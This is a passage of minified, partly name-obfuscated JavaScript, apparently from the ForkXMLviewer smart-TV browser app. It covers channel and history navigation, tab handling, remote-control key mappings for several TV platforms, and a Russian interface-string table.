if(count==0&&c.select>-1)return c.focused(-1);c.select=parseInt(c.select);if(c.select>=0&&c.page.sPos[c.select]){c.page.posX=c.page.sPos[c.select][0];c.page.posY=c.page.sPos[c.select][1]}
if(x!=0){if(c.select>=0&&c.page.getTypePos(c.curCh(),c.select)=="list"){if((c.select+x*10)<0)c.select=0;else if((c.select+x*10)>=count){if(gV(c.page.global,"next_page_url")!=""&&c.select==count-1){var ttl=c.title.match(/^Стр. (\d+) \/ (.*)$/);if(ttl!=null)var title="Стр. "+(ttl[1]*1+1)+" / "+ttl[2];else title="Стр. 2 / "+c.title;c.navigate({"title":title,"icon":""+c.icon,"playlist_url":gV(c.page.global,"next_page_url")})}else c.select=count-1}else c.select=(1*c.select)+x*10}else c.select=(1*c.select)+x}else if(y!=0){if(y==1){if(c.select==-1||c.page.posY==c.sPosMaxY()){if(c.page.posY==c.sPosMaxY()){$_("controlcontent").style.paddingBottom="70px";buff.scrollsitetop(buff.scrollsitetop()+70);setTimeout('$_("controlcontent").style.paddingBottom="43px";',100);return}
c.select=c.sPosGetXbyRow(c.page.posX,0)}else{c.select=c.sPosGetXbyRow(c.page.posX,++c.page.posY)}}else{if(c.select==-1)c.select=c.sPosGetXbyRow(c.page.posX,c.sPosMaxY());else if(c.page.posY==0)c.select=-1;else c.select=c.sPosGetXbyRow(c.page.posX,--c.page.posY)}}
return c.focused()},play:function(n,mode){var c=this;if(n!=null)c.select=n;if(!vPlayer.stopped&&c.select>=0&&!curCh("playlist_url")&&vPlayer.is_mini()&&vPlayer.player().setMini){if(vPlayer.getCur()>0&&vPlayer.playElement.ident==getIdent(c.select)){if(rek_url){rek_url="";is_adult=!0}else{vPlayer.playElement.mini=0;vPlayer.renderPlayer();vPlayer.player().setMini()}}else{vPlayer.lIOQ0lI1iZm1hQ1O0Ypr();setTimeout("IlO11lQ0().play();",200)}}else{if(!vPlayer.stopped)vPlayer.lIOQ0lI1iZm1hQ1O0Ypr();if(c.isLoading){c.stopLoad();c.loadPage=null;c.isLoading=0}
if(c.select>=0&&c.select<c.page.channels.length){c.navigate(c.page.channels[c.select],mode)}}},navigate:function(el,mode,goBack,inputed){var c=this;if(gV(c.page,"is_mark")){if(c.page.is_mark_array[c.select])c.page.is_mark_array[c.select]=0;else c.page.is_mark_array[c.select]=1;return c.focused()}
if(c.loadPage!=null){c.stopLoad();setTimeout(function(){c.navigate(el,mode,goBack,inputed)},50);return}
if(el==null)return c.play();if(typeof el=="string")el={"title":el,"playlist_url":el,"stream_url":""};is_loadpage(1);c.loadPage=FXMLPage.create();c.loadPage.parentURL=gV(c.page,"lII1I1PVBuI1lIlYpr");c.loadPage.parentIMG=gV(c.page,"icon");c.loadPage.parentTITLE=gV(c.page,"title");c.loadPage.title=gV(el,"title");c.loadPage.icon=gV(el,"logo_30x30");c.loadPage.lII1I1PVBuI1lIlYpr=gV(el,"playlist_url")+gV(el,"stream_url");c.loadPage.SAVE_lII1I1PVBuI1lIlYpr=gV(el,"playlist_url");c.loadPage.count=-1;if(gV(el,"iframeid")!==""){goBack=!0;if(gV(el,"sourceurl")!="")c.loadPage.llIl1100glLO10l1Ypr=2;else c.loadPage.llIl1100glLO10l1Ypr=1}
el.index=c.select;c.isLoading=1;c.el=el;sethash();var param={"elCh":el,"origelCh":l0OIIlIIlONuu1111Ypr(ll1lI1lI0sl0OlIYpr(el)),"top":buff.scrollsitetop(),"elGlobal":{},"mode":mode,"l11I101vQBOw0llIYpr":c,"goBack":goBack,"inputed":inputed,"input":{}};if(gV(mode)=="refresh")param.refresh=!0;if(c.page&&c.page.input)param.input=c.page.input;if(gV(el,"navigateurl")!=""){param.data=el;c.loadPage.lII1I1PVBuI1lIlYpr=gV(el,"navigateurl");c.loadPage.toChannels(param)}else c.loadPage.openCh(param)},stopLoad:function(){var c=this;clearTimeout(l1IO1lzlVJI1Oll0Ypr);clearTimeout(fastremote_timer);if(c.loadPage!=null){c.loadPage.cancel()}
c.isLoading=0;if(waitc.start){waitcurl("abort")}
if(is_ifr()){curPage.IFRAMES=[];for(var i in curPage.channels){curPage.channels[i].iframe="";curPage.channels[i].iframeid=""}}
xhr2=null;xhr=null;xhr4=null;is_loadpage(0)},stop:function(){var c=this;if(c.loadPage!=null){c.loadPage.cancel()}
if(c.page!=null){c.page.cancel()}
c.focused()},cleargo:function(){var c=this;if(gV(c.page,"is_mark")){c.page.is_mark=!1;c.page.marked=!1;c.page.is_mark_array={}}
favarray=null},replace:function(ch){var c=this;c.cleargo();if(ch!=null)gP().channels=ch;gP().renderChannels(getSelect(),"update");c.focused()},reload:function(){var c=this;c.cleargo();c.navigateHist(-1,!0)},back:function(){var c=this;c.cleargo();vPlayer.stream.stoPip();if(c.loadPage)c.stopLoad();else c.navigateHist(-2)},forward:function(k){var c=this;if(k==null)k=0;if(!c.fwhistory[k])kjtYpr.inf("_FPEmpty forward history_!",1500);else{for(var i=0;i<=k;i++)c.history.push(c.fwhistory.shift());c.save();c.navigateHist()}},navigateHist:function(k,refresh){var c=this;c.cleargo();if(c.loadPage){c.stopLoad();setTimeout(function(){c.navigateHist(k,refresh)},50);return}
if(k==null)k=-1;else k=parseInt(k);var n=c.history.length+k;c.lastResel="";if(!c.history[n])kjtYpr.inf("_FPEmpty return history_!",1500);else{if(k<-1){if(c.get("b")=="1"){kjtYpr.popUp("_FPEtaVklBzabl_!<br>_FPDlRvIn_ _FPMenu_ / _FPRazblVkl_",1500);return}else{for(var i=-1;i>k;i--)c.fwhistory.unshift(c.history.pop());}}
var x=c.history[n];if(gV(x,"url")==""){c.history.pop();c.navigateHist()}else{if(k==-1&&!c.lII1I1PVBuI1lIlYpr)c.lII1I1PVBuI1lIlYpr=x.url;var CI=x.url.split("#submenu")[0];if(CI==kjtYpr.l0lOIIIW0lDI1I0lYpr)kjtYpr.Password="";breakScreen(getInfoUrl(x.url));var ch={"title":x.title,"logo_30x30":x.img,"stream_url":x.url.replace("#stream_url",""),"playlist_url":"","parser":gV(x,"p"),"local":gV(x,"l"),"mb_parser":gV(x,"mp")};if(prev[CI]){if(gV(prev[CI],"cacheinfo")=="nocache"||refresh){delete(prev[CI])}else if(c.lII1I1PVBuI1lIlYpr.indexOf("#submenu")>0){if(gV(prev[CI],"url")=="")prev[CI].url=getInfoUrl(x.url)}
var nO=l0OIIlIIlONuu1111Ypr(ll1lI1lI0sl0OlIYpr(prev[CI]));if(nO&&x.url.match(/^(http|searchEngines|view-source:)/)){goBack=!0;c.page=FXMLPage.create();c.page.typeSource="cache";c.page.count=-1;c.page.lII1I1PVBuI1lIlYpr=c.page.SAVE_lII1I1PVBuI1lIlYpr=x.url;c.isLoading=0;c.page.channels=[];c.page.global={};nO.returnSelect=gV(x,"s");nO.returnTop=gV(x,"top");if(typeof nO.setcookie!="undefined")delete nO.setcookie;var pq={"elCh":ch,"data":nO,"mode":null,"l11I101vQBOw0llIYpr":c,"goBack":goBack};c.page.toChannels(pq);if(x.url.indexOf("extensions://")==0){$_("ext").style.display="block";ext_focus()}
c.save();return}}
if(x.url.indexOf("#stream_url")>0){if(is_hdgo(x.url))ch.menu_url="hdgo";norek=!0;c.navigate(ch)}else{if(refresh){x.s=getSelect();var mode="refresh"}else mode=null;c.navigate({"title":x.title,"defaultSelect":gV(x,"s"),"logo_30x30":x.img,"playlist_url":x.url,"parser":gV(x,"p"),"local":gV(x,"l"),"mb_parser":gV(x,"mp"),"stream_url":""},mode,!0)}
c.save()}}},getTitle:function(n){var c=this;var t=c.get("title").replace(/<.*?>/g,"").replace(/'/g,"");if(c.loadPage!=null&&l0O0l0111mJXG1OII1OYpr(c.get("url"))){if(c.isLoading)return c.loadPage.lII1I1PVBuI1lIlYpr}
if(t=="")t=c.get("url");if(c.is_private)t="*"+t;return t},getIcon:function(n){var image=this.get("img").replace(/<.*?>/g,"").replace(/'/g,"");if(image==""){for(var j=this.history.length-2;j>=0;j--){if(l0O0l0111mJXG1OII1OYpr(this.history[j].url)){if(image=="")image="none";break}
if(this.history.img!=""){image=gV(this.history[j],"img");break}}}
return image},save:function(s){if(this.is_private)return;if(s==null)s=this.history;maJor.write("url"+this.id,ll1lI1lI0sl0OlIYpr(s))},get:function(v,k){if(k==null)k=-1;var n=this.history.length+k;if(!this.history[n])return"";else if(v==null)return this.history[n];else return gV(this.history[n],v)},put:function(name,v,k){if(k==null)k=-1;var n=this.history.length+k;if(typeof this.history[n]!='undefined'){this.history[n][name]=v;this.save()}},loadHist:function(s){var c=this;this.history=l0OIIlIIlONuu1111Ypr((s||maJor.read("url"+this.id)))||[];if(!c.history.length)c.history.push({"url":kjtYpr.l0lOIIIW0lDI1I0lYpr,"title":"_FPDobroPozhalovat_","icon":"none"});c.title=c.getTitle();c.icon=c.getIcon()},};var oInset={tabs:[],l1lIIOlllvBXuv1l1IYpr:20,insetActive:0,lastInset:0,insetSelect:0,insetSets:{},ibut:["weather","remotesrc","acesrc","widget_time"],addtab:function(n){var b=Inset.create();b.init(n);this.tabs.push(b);return b},omni_hor:2,omniSel:function(n){var c=this,m=maJor;if(n!=null){if(n=="+")c.omni_hor++;else if(n=="-")c.omni_hor--;else c.omni_hor=n}
if(c.omni_hor>=m.omniBut.length)c.omni_hor=0;else if(c.omni_hor<0)c.omni_hor=m.omniBut.length-1;for(var i=0;i<m.omniBut.length;i++){if(getSelect()==-4&&c.omni_hor==i)$_(m.omniBut[i].id).style.border="2px solid #5590e7";else $_(m.omniBut[i].id).style.border="2px solid transparent"}},editUrl:function(){if(handler=="menu"){var v=gP("lII1I1PVBuI1lIlYpr")||Ill001("lII1I1PVBuI1lIlYpr");if(v.indexOf("searchEngines")==0)v=v.split("|")[1];if(v=="about:blank")v="";setSelect(-4);VK.open({el:{"title":"_FPEnter search query or URL_","playlist_url":"searchEngines","type":"omnibox","presearch":"http://omnibox.spiderxml.com/?type=all","value":v,"search_on":"_FPEnter search query or URL_"}})}},allI:function(){var c=this,m=maJor;var a=[];for(var i=0;i<=oInset.tabs.length;i++){if($_("inset"+i)!=null)a.push("inset"+i)}
m.each(c.ibut,function(val){if($_(val)&&$_(val).style.display!="none")a.push(val)});return a},listInset:function(){var c=this,m=maJor;if(insetSelect<0)insetSelect=c.allI().length-1;else if(insetSelect>=c.allI().length)insetSelect=0;$_("iactive").style.background='';m.each(c.allI(),function(val,i){var el=$_(val);if(el){if(i==insetActive)var iB="rgb(63, 77, 81)";else iB="none";if(getSelect()==-1&&insetSelect==i){if(i!=insetActive)iB="#697e84";if(insetSelect==insetActive)$_("iactive").style.background='rgb(108, 124, 128)';el.style.border="2px solid rgb(85, 144, 231)"}else el.style.border="2px solid transparent";el.style.background=iB;if($_("insetbrd"+i)){if(i==insetActive||i==insetActive-1||((i==insetSelect||i==insetSelect-1)&&getSelect()==-1))$_("insetbrd"+i).style.borderRight="1px solid transparent";else $_("insetbrd"+i).style.borderRight="1px solid #1f1f1f"}
el.onmousemove=function(){if(handler=='menu'){setSelect(-1);insetSelect=i;linkOver()}};el.onmousedown=function(){setSelect(-1);insetSelect=i;p_d()};el.onmouseup=function(){setSelect(-1);insetSelect=i;p_u()};el.onclick=function(){if(!c.long_left){insetSelect=i;c.playInset(val)}c.long_left=0}}})},renderInset:function(){var c=this,m=maJor;if(c.insCache&&c.insCache==insetActive+"|"+oInset.tabs.length+"|"+$_("inset").offsetWidth)return c.insetUpdate();var html="";var rl=$_("inset").offsetWidth-48-(8*oInset.tabs.length);var rlp=100*rl/$_("inset").offsetWidth;var insetW=(rlp/(oInset.tabs.length)).toFixed(2)-0.01;if(oInset.tabs.length<3){insetW=46}
m.each(c.tabs,function(val,i){var dsp="block";if(val.icon=="err")var ico=icoerr;else if(val.icon=="none"){dsp="none";ico=icodef}else if(val.getIcon()==""||val.icon=="def")ico=icodef;else ico=_img(val.getIcon());html+="<div id='inset"+i+"' title='"+val.getTitle()+"' style='height: 30px;width:"+insetW+"%;float:left;border-radius: 10px 10px 0px 0px;overflow: hidden;'>"+"<img id='imginset"+i+"' height='23' style='max-width:23px; width:45%; float:left;display:"+dsp+";padding-top:6px;padding-left:4px;' onerror=\"onImgError(this);\" src='"+ico+"' />"+(i==insetActive?"<img id='iactive' onmouseout=\"this.style.background='';\" onmousemove=\"if(handler=='menu') this.style.background='rgb(108, 124, 128)';\" width='10' height='10' style='border-radius:5px;float:right;padding:1px 3px;margin-top:12px;' src='"+icoclose+"'/>":"")+"<div id='insetttl"+i+"' style='height: 80%;overflow: hidden;background-color:transparent;margin:3px 0px 0px 5px;'>"+val.getTitle()+"</div>"+"</div><span  id='insetbrd"+i+"' style='width: 3px;margin: 5px 0px;border-right: 1px solid rgb(31, 31, 31);float: left;'>&nbsp;</span>"});var i=c.tabs.length;html+="<div id='inset"+i+"' title='New inset' style='height: 30px;margin-left: 3px;  border-radius: 50%;float:left;'>"+"<img id='imginset"+i+"' width='30' height='24' style='padding:3px 2px 3px 3px;' alt='+' src='"+_img("_ST_page_plus.png")+"' />"+"<div id='insetttl"+i+"' style='overflow: hidden;background-color:transparent;'></div>"+"</div>";$_("inset",html);c.listInset();c.insCache=insetActive+"|"+oInset.tabs.length+"|"+$_("inset").offsetWidth},newInset:function(m){var c=this;if(oInset.tabs.length==oInset.l1lIIOlllvBXuv1l1IYpr){kjtYpr.popUp("Уже открыто максимальное количество вкладок!",2000);return}
breakScreen("about:blank");oInset.tabs.push(OeInit(Inset));insetActive=oInset.tabs.length-1;if(m)IlO11lQ0().is_private=1;c.renderInset();c.listInset();gotoStart()},playInset:function(v){var c=this;if($_("ext").style.display=="block")$_("ext").style.display="none";if($_("vk").style.display!="none"){$_("vk").style.display="none";handler="menu"}
chGroupSel=0;if(insetSelect!=insetActive)oInset.tabs[insetActive].stopLoad();if(insetSelect==oInset.tabs.length)c.newInset(0);else if(insetSelect>oInset.tabs.length){if(!v)v=c.allI()[insetSelect];if(v=="weather")olI11lQ1OhFv1II1Ypr("http://cloudflare.appfxml.com/browseraccount/?do=weather&id=set");else if(v=="remotesrc"||v=="acesrc")maJor.Remote.init();else if(v=="widget_time"){m=[];for(var i=-11;i<=11;i++){var t=new Date(T.inetTime+i*3600000);var dstring=to(t.getHours(),t.getMinutes());m.push({"title":dstring,"playlist_url":"about:settings#set:JTVRegion:"+i+":return"})}
kjtYpr.llI0IOruD0IOI1IYpr("onlymenu",m)}
return}else if(insetSelect!=insetActive){insetActive=insetSelect;c.renderInset();IlO11lQ0().navigateHist(-1);c.listInset()}else if(insetSelect==insetActive){if(oInset.tabs[insetActive].get("b")=="1")kjtYpr.popUp("_FPEtaVklBzabl_!<br>_FPDlRvIn_ _FPMenu_ / _FPRazblVkl_",1500);else{confirmed.create("_FPClose tab_? "+oInset.tabs[insetSelect].title).fun0=function(){oldinset=oInset.tabs.splice(insetSelect,1);for(var i=0;i<oInset.l1lIIOlllvBXuv1l1IYpr;i++){if(oInset.tabs[i]){oInset.tabs[i].id=i;oInset.tabs[i].save()}else maJor.write("url"+i,"")}
if(oInset.tabs.length==0){c.newInset(0)}
if(insetActive>oInset.tabs.length-1)insetActive=oInset.tabs.length-1;insetSelect=insetActive;maJor.write("urlInset",insetActive);c.renderInset();c.listInset();oInset.tabs[insetActive].navigateHist(-1)}}}
maJor.write("urlInset",insetActive)},insetUpdate:function(){var c=this,m=maJor;var i=insetActive,t=IlO11lQ0();if(t.icon=="err")var ico=icoerr;else if(t.icon=="none")ico=icodef;else if(t.getIcon()==""||t.icon=="def")ico=icodef;else ico=_img(t.getIcon());$_("insetttl"+i,t.getTitle());$_("imginset"+i).src=ico;$_("imginset"+i).style.display="block";c.listInset()},getInfoUrl:function(url){url=url||gV(Ill001("lII1I1PVBuI1lIlYpr")||gP("lII1I1PVBuI1lIlYpr"));if(url.indexOf("/alexkdpulg.php?list=")>0)url=unescape(url.split("?list=")[1]);url=url.replace(/(\?|&)?w_lang=.*$/,"");return url},breakScreen:function(u){u=gV(u);if(u.indexOf("curl ")==0){var m=parseCURL(u);u=m.url}
if(u.indexOf("#POST")>0)u=u.split("#POST")[0];if(u.match(/^searchEngines(#url|xml)?\|/))u=u.split("|")[2];$_("navigate",'<span id="navinfo2" style="color:gray;">'+gV($_("navinfo2"),"innerHTML")+'</span>'+"<span id='navurl' style='font-weight: bold;padding-left: 5px;overflow:hidden;'>"+u+"</span>");if($_("content")){$_("content","");$_("description","")}
sethash()},init:function(){var c=this,m=maJor;var stinset;if(m.params.get("recovery")){m.statusbar("_FPVozobnovlenie_");for(i=0;i<c.l1lIIOlllvBXuv1l1IYpr;i++)if(m.read("url"+i)&&oInset.addtab(i).get("a")=="1")stinset=oInset.tabs.length-1}
if(oInset.tabs.length==0)oInset.addtab(0);insetActive=stinset||parseInt(m.read("urlInset"))||0;if(!oInset.tabs[insetActive])insetActive=oInset.tabs.length-1;c.breakScreen(IlO11lQ0().get("url"));c.renderInset();c.listInset();setTimeout("if(IlO11lQ0().INC==-1) IlO11lQ0().navigateHist(-1);",1000)}};var menuSel=0,menuSubSel=-2,doubleTimer=null,doubleEvent=0,mmes=0,runtime=0;var tvKey,xVol=80;var piframe=!1,hashR=!1,ifrrw=!1,ifrreaded=!1,xhr_referer=2;var tmpl_button='<div style="text-align:center;height:26px;margin:4px; font-size: 23px;   border-radius: 5px;     padding: 5px 16px 6px;    color: #111;    background: rgb(232, 240, 254);">$title</div>';var tmpl_info="<div style='position:absolute;top:550px;left:870px;width: 400px;'><div style='min-height: 80px;border-radius:5px;padding:5px; background: #546266;color: #fff;font-size:22px;width: 380px;'>info</div><span style='border: 10px solid transparent; border-bottom: 10px solid #546266; border-left: 10px solid #546266;margin-top:-20px;float:right;'></span></div>";var tmpl_box='<div style="width: 200px;margin:4px 2px; padding-left: 8px; padding-right: 8px; font-size:21px;word-break: break-word;">'+'<img src="$logo_30x30" style="float: left;width:41px;margin:3px;" />'+'		<div style="font-weight:bold;">'+'			$title'+'				</div><div style="catalog-card-creator">'+'					$description'+'				</div>'+'</div>';var tmpl_box2='<div style="height:75px;font-style: italic;width: 180px;margin:4px 1px; padding-left: 2px; padding-right: 2px; font-size:21px;word-break: break-all;text-align:center;">'+'<img src="$logo_30x30" style="float: left;width:41px;margin:2px;" />'+'		<div style="font-weight:normal;">'+'			$title'+'				</div>'+'</div>';var tmpl_box3='<div style="height:75px;font-style: italic;width: 125px;margin:4px 1px; padding-left: 8px; padding-right: 8px; font-size:21px;    word-break: break-all;text-align:center;">'+'		<div style="font-weight:normal;">'+'			$title'+'				</div>'+'</div>';var labelStart="font-size: 90%;text-align: left;margin-left: -1%;margin-top:3px;    font-style: italic;";var startL=["omnibox","spider","fav","top","service"];var startN={"omnibox":"_FPOmnibox address bar and search_","spider":"_FPBeginner_","fav":"_FPFavorites_","top":"_FPHistory_","service":"_FPLocal_"};var startT={"omnibox":"","spider":"<div style='"+labelStart+"'>_FPBeginner_</div>","fav":"<div style='"+labelStart+"'>_FPFavorites_</div>","service":"<div style='"+labelStart+"'>_FPLocal_</div>","top":"<div style='"+labelStart+"'>_FPHistory_</div>"};var model="none",platform="";function onfly(){if($_("statbar2")==null){var div=document.createElement('div');div.id="statbar2";div.style.bottom="0px";div.style.height="20px";div.style.left="0px";div.style.display="none";div.style.overflow="hidden";div.style.width="100%";div.style.zIndex="0";div.style.fontSize="16px";div.style.position="absolute";div.style.whiteSpace="nowrap";document.getElementsByTagName('body')[0].appendChild(div)}}
if(typeof ipG=="undefined")var ipG="";if(typeof ipCountry=="undefined")var ipCountry="";var actual_img=!1,pluginAPI=null;if(typeof version_local_files=="undefined")version_local_files=0;if(typeof version_local_js=="undefined")version_local_js=0;var box_client="ForkXMLviewer",pluginAPI=null;if(document.location.href.indexOf("dns=")>0)var uadns=document.location.href.split("dns=")[1];else if(typeof dns!="undefined")uadns=dns;else uadns="";if(window.Common){try{var widgetAPI=new Common.API.Widget();var pluginAPI=new Common.API.Plugin();console.log=function(a){alert(a)}}catch(e){}}
function css_w(n,m,k){return n}
function css_wh(n,m,k){return n}
var scmdf=!0;if(maJor.platform()=="maple"){try{tvKey=new Common.API.TVKeyValue();var VK_ENTER=tvKey.KEY_ENTER;var VK_PAUSE=tvKey.KEY_PAUSE;var VK_PAGE_UP=tvKey.KEY_CH_UP;var VK_PAGE_DOWN=tvKey.KEY_CH_DOWN;var VK_LEFT=tvKey.KEY_LEFT;var VK_UP=tvKey.KEY_UP;var VK_RIGHT=tvKey.KEY_RIGHT;var VK_DOWN=tvKey.KEY_DOWN;var VK_0=tvKey.KEY_0;var VK_1=tvKey.KEY_1;var VK_2=tvKey.KEY_2;var VK_3=tvKey.KEY_3;var VK_4=tvKey.KEY_4;var VK_5=tvKey.KEY_5;var VK_6=tvKey.KEY_6;var VK_7=tvKey.KEY_7;var VK_8=tvKey.KEY_8;var VK_9=tvKey.KEY_9;var VK_NUMPAD_0=96;var VK_NUMPAD_1=97;var VK_NUMPAD_2=98;var VK_NUMPAD_3=99;var VK_NUMPAD_4=100;var VK_NUMPAD_5=101;var VK_NUMPAD_6=102;var VK_NUMPAD_7=103;var VK_NUMPAD_8=104;var VK_NUMPAD_9=105;var VK_A=90;var VK_B=66;var VK_C=67;var VK_D=68;var VK_E=69;var VK_G=71;var VK_H=72;var VK_I=73;var VK_J=74;var VK_K=75;var VK_O=79;var VK_Q=81;var VK_R=82;var VK_S=83;var VK_T=84;var VK_U=85;var VK_V=86;var VK_W=87;var VK_X=88;var VK_Y=89;var VK_Z=90;var VK_RED=tvKey.KEY_RED;var VK_GREEN=tvKey.KEY_GREEN;var VK_YELLOW=tvKey.KEY_YELLOW;var VK_BLUE=tvKey.KEY_BLUE;var VK_FAST_FWD=tvKey.KEY_FF;var VK_REWIND=tvKey.KEY_RW;var VK_STOP=tvKey.KEY_STOP;var VK_PLAY=tvKey.KEY_PLAY;var VK_MUTE=tvKey.KEY_MUTE;var VK_INFO=tvKey.KEY_INFO;var VK_BACK=tvKey.KEY_RETURN;var VK_EXIT=tvKey.KEY_EXIT;var VK_TOOLS=tvKey.KEY_TOOLS;var KEY_VOLUME_PLUS=77;var KEY_VOLUME_MINUS=76}catch(e){}}else{var VK_ENTER=13;var VK_PAUSE=19;var VK_PAGE_UP=33;var VK_PAGE_DOWN=34;var VK_LEFT=37;var VK_UP=38;var VK_RIGHT=39;var VK_DOWN=40;var VK_HID_BACK=8;var VK_HID_HOME=36;var VK_HID_END=35;var VK_HID_INSERT=45;var VK_HID_DEL=46;var VK_HID_ESC=461;var VK_HID_CTRL=17;var VK_HID_ALT=18;var VK_HID_RT_ALT=21;var VK_CAPS_LOCK=20;var VK_SHIFT=16;var VK_LANG_SEL=229;var VK_0=48;var VK_1=49;var VK_2=50;var VK_3=51;var VK_4=52;var VK_5=53;var VK_6=54;var VK_7=55;var VK_8=56;var VK_9=57;var VK_NUMPAD_0=96;var VK_NUMPAD_1=97;var VK_NUMPAD_2=98;var VK_NUMPAD_3=99;var VK_NUMPAD_4=100;var VK_NUMPAD_5=101;var VK_NUMPAD_6=102;var VK_NUMPAD_7=103;var VK_NUMPAD_8=104;var VK_NUMPAD_9=105;var VK_GRAVE=192;var VK_DASH=189;var VK_EQUAL=187;var VK_BACK_SLASH=220;var VK_LEFT_BLACKET=219;var VK_RIGHT_BLACKET=221;var VK_SEMICOLON=186;var VK_APOSTROPHE=222;var VK_COMMA=188;var VK_PERIOD=190;var VK_SLASH=191;var VK_SPACE_BAR=32;var VK_A=65;var VK_B=66;var VK_C=67;var VK_D=68;var VK_E=69;var VK_F=70;var VK_G=71;var VK_H=72;var VK_I=73;var VK_J=74;var VK_K=75;var VK_L=76;var VK_M=77;var VK_N=78;var VK_O=79;var VK_P=80;var VK_Q=81;var VK_R=82;var VK_S=83;var VK_T=84;var VK_U=85;var VK_V=86;var VK_W=87;var VK_X=88;var VK_Y=89;var VK_Z=90;var VK_RED=403;var VK_GREEN=404;var VK_YELLOW=405;var VK_BLUE=406;var VK_REWIND=412;var VK_STOP=413;var VK_PLAY=415;var VK_FAST_FWD=417;var VK_INFO=457;var VK_BACK=461;var VK_LGE_MAGIC_VOICE=1015;var KEY_VOLUME_PLUS=999;var KEY_VOLUME_MINUS=998}
if(maJor.platform()=="spark"){var VK_PAUSE=66;var VK_PAGE_UP=7;var VK_PAGE_DOWN=8;var VK_RED=112;var VK_GREEN=113;var VK_YELLOW=405;var VK_BLUE=115;var VK_FAST_FWD=65;var VK_REWIND=70;var VK_STOP=10;var VK_PLAY=80;var VK_MUTE=78;var VK_INFO=116;var VK_BACK=117;var VK_LGE_MAGIC_VOICE=1015;var KEY_VOLUME_PLUS=77;var KEY_VOLUME_MINUS=76}
if(maJor.platform()=="sharp"){VK_PAGE_UP=427;VK_PAGE_DOWN=428}
if(maJor.platform()=="tizen"){VK_RED=403;VK_GREEN=404;VK_YELLOW=405;VK_BLUE=406;VK_PAGE_UP=427;VK_PAGE_DOWN=428;VK_BACK=0;VK_MUTE=449;VK_PAUSE=19;VK_REWIND=412;VK_STOP=413;VK_PLAY=415;VK_FAST_FWD=417}
var resolution_portal="",stb;if(maJor.platform()=="dune"){var VK_RED=193;var VK_GREEN=194;var VK_YELLOW=195;var VK_BLUE=196;var VK_FAST_FWD=205;var VK_REWIND=204;var VK_STOP=178;var VK_PAUSE=218;var VK_INFO=199;var VK_EXIT=18;var KEY_VOLUME_PLUS=175;var KEY_VOLUME_MINUS=174;if(typeof document.referrer!="undefined"){if(document.referrer.length>5)resolution_portal=document.referrer}}
if(maJor.platform()=="mag"){var VK_RED=112;var VK_GREEN=113;var VK_YELLOW=114;var VK_BLUE=115;var VK_FAST_FWD=70;var VK_REWIND=66;var VK_STOP=83;var VK_PAUSE=82;var VK_MUTE=78;var VK_INFO=89;var VK_EXIT=27;var KEY_VOLUME_PLUS=107;var KEY_VOLUME_MINUS=109;if(window.gSTB){stb=gSTB;stb.EnableServiceButton(!0);stb.InitPlayer();if(document.referrer){if(document.referrer.length>5)resolution_portal=document.referrer;else resolution_portal="file:///home/web/services.html"}
var stbEvent={onEvent:function(event){if(event==4)vPlayer.OnBufferingComplete();if(event==1)vPlayer.endvideo();if(event==5)vPlayer.eventerrvideo()},event:0};window.moveTo(0,0);stb.SetVolume(xVol)}}
if(typeof _lang=="undefined")var _lang={};_lang.ru={"_name":"Русский","Beginner":"Начало","_powered":"","Transparency in the interface":"Прозрачности в интерфейсе","Sign in to sync browser data across devices":"Войдите, чтобы синхронизировать данные браузера на разных устройствах","Enter search query or site URL, playlist XML / M3U":"Введите поисковый запрос или URL-адрес сайта, плейлиста XML / M3U","My account":"Мой аккаунт","Edit in Search engines":"Редактировать в Поисковые системы","Profile":"Профиль","enter":"войти","Set name":"Задать имя","Display time":"Показывать часы","mysets":"моих настроек","Add stripes":"Добавить полосы","Zakladki":"Закладки","zakladki":"закладки","Vneshnie":"Внешние","Vnutr":"Внутренние","Istoriya":"История","poiskov":"поисков","Raznoe":"Разное","Seriali":"Сериалы","Filmi":"Фильмы","Tema":"Тема","History":"История","Adjust weather":"Настроить погоду","Server not response":"Сервер не отвечает","Open closed tab":"Открыть закрытую вкладку","Animate snow":"Анимация снега","Zakladki":"Закладки","Your country":"Страна использ. прилож.","Oneaudiotrack":"Одна звуковая дорожка","OpredelenieDns":"Определение ДНС","RegistraciyaVseti":"Регистрация в сети","SchitivanieNastroek":"Считывание настроек","Inicializaciya":"Инициализация","Zoom":"Масштаб","Copied denied by author playlist":"Автор плейлиста запретил копирование","Timeout":"Таймаут","pleera":"плеера","Zagruzka":"Загрузка","Interface":"интерфейса","menu":"меню","Cancel":"Отмена","Size data":"Размер данных","data from server":"данных с сервера","Error download data, load local settings":"Ошибка получения данных, загружены локальные настройки","Menu":"Меню","Store data":"Хранить данные","Save and":"Сохранить и","Saving data to the server every 5 minutes or by pressing the Menu button Save and":"Сохранение данных на сервер происходит каждые 5 минут или по нажатию кнопки Меню Сохранить и","On Server":"На сервере","Local":"Локально","ChtenieNastroekPoiska":"Чтение настроек поиска","Vozobnovlenie":"Возобновление","Soobshestvo":"Сообщество","Go to settings":"Перейти к настройкам","Add search engine":"Добавить поисковик","Vash":"Ваш","macAdres":"мак-адрес","404NotFound":"Ошибка 404. Такого файла не существует","HotiteIskatVdrugihMestah":"Хотите искать это других местах","Vospolzuites":"Воспользуйтесь","NaitiVglobPoiske":"Найти в поисковых системах","GlobPoisk":"Глобальный поиск","DobroPozhalovat":"Новая вкладка","Frequently Visited Sites":"Часто посещаемые сайты","ViberiteChtoIskat":"Выберите что искать","ViberiteEpg":"Выберите нужный ЕПГ для канала","Stranica":"Страница","ZdesPusto":"Здесь пусто","PoiskPrervan":"Поиск прерван","UdalenaGrupa":"Была удалена начальная группа","StartovoeMenu":"Стартовое меню","Sync":"Синхронизация","Export":"Экспорт","SaveSetServ":"Сохранить настройки на сервере","Import":"Импорт","nastrdruga":"настроек","VvLogDr":"Введите логин пользователя от сайта","PolNastrDr":"Получить настройки пользователя","Are you sure":"Вы уверены","Delete":"Удалить","EtoMozhUd":"Это может удалить текущие настройки виджета","Steret":"Стереть","NastroikiPrilozheniya":"Настройки приложения","NastrStartMenu":"Настройки начальной страницы","NastrGlPoisk":"Поисковая система","DobavlenoV":"Добавлено в","DlVklPer":"Для включения перейдите в Настройки / Настройки поиска /","ZaklUzheEst":"Такая закладка уже есть","vstm":"в стартовом меню","UdMsNsM":"Удалить из стартового меню можно в <br>Настройки / Настройки Стартового меню","Udalit":"Удалить","Clear":"Очистить","Vstavit":"Вставить","Kopirovat":"Копировать","Ssilka":"Ссылка","Search":"Поиск","NazhmVpravo":"Нажмите вправо","chud":"чтобы удалить","Vkl":"Включено","Otkl":"Отключено","Vkl.":"Вкл.","Otkl.":"Откл.","Button":"Кнопка","PeremV":"Переместить в","IstOchishena":"История 